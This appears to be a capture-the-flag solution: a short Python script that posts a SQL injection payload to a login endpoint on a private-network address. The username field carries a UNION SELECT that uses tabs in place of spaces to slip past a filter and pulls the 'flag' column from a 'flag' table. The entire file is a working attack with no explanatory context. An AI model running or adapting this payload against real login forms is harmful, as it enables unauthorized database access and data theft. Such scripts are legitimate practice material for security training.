from requests import *

url="http://172.19.0.2:3004/login"

data={"username":"'UNION\tSELECT\tNULL,NULL,flag\tFROM\tflag--","password":"pas"}
r=post(url,data=data)
print(r.text)